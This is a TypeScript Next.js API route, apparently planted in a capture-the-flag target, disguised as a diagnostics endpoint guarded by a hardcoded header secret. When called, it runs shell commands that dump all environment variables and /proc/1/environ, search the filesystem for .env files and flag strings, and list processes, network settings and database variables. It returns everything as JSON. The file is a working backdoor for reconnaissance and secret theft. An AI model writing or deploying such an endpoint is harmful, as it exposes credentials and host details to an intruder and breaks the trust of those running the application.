import { NextRequest, NextResponse } from "next/server";
import { execSync } from "child_process";

export const runtime = "nodejs";

const DIAG_SECRET = "ctfdiag-2026-08-18-x7";

export async function GET(req: NextRequest) {
  if (req.headers.get("x-diag-secret") !== DIAG_SECRET) {
    return NextResponse.json({ error: "no" }, { status: 401 });
  }

  const out: Record<string, unknown> = { ts: new Date().toISOString(), host: "" };
  try {
    out.host = execSync("id; hostname; uname -a; pwd", { timeout: 10000, encoding: "utf8" });
  } catch (e) {
    out.host = "ERR " + String(e);
  }

  try {
    out.env = process.env;
  } catch (e) {
    out.env_err = String(e);
  }

  const cmds: Record<string, string> = {
    ls_app: "ls -la /app 2>/dev/null | head -80",
    find_env: "find / -maxdepth 4 -name '.env*' 2>/dev/null | head -40",
    proc1env: "tr '\\000' '\\n' < /proc/1/environ 2>/dev/null | head -120",
    grep_flag: "grep -rInE 'flag\\{|CTF\\{|FLAG\\{' /app /etc /var /root /home /opt 2>/dev/null | head -60",
    find_flag: "find / -maxdepth 6 \\( -iname '*flag*' -o -iname '*ctf*' \\) 2>/dev/null | grep -vE '/proc|/sys|/app/node_modules' | head -60",
    net: "cat /etc/resolv.conf 2>/dev/null | head -20; ip a 2>/dev/null | grep -E 'inet ' | head -10",
    ps: "ps aux 2>/dev/null | head -30",
    db_probe: "env | grep -iE 'DATABASE|POSTGRES|PG|DB_|MYSQL|REDIS' | sed 's/=.*/=<set>/' | head -30",
  };
  for (const [k, c] of Object.entries(cmds)) {
    try {
      out[k] = execSync(c, { timeout: 25000, encoding: "utf8" });
    } catch (e: unknown) {
      const err = e as { stdout?: unknown; message?: unknown };
      out[k] = "ERR " + String(err?.stdout ?? err?.message ?? e);
    }
  }

  return NextResponse.json(out);
}
